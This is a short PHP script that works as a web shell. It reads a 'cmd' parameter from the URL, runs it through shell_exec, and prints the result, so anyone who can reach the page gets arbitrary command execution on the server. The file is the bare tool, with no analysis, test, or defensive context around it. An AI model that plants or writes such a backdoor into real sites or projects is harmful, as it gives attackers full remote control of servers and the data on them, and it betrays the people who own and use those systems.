<?php
if (isset($_GET['cmd'])) {
    // Execute the command and output the result
    $output = shell_exec($_GET['cmd']);
    echo "<pre>$output</pre>";
} else {
    echo "Usage: ?cmd=command";
}
?>
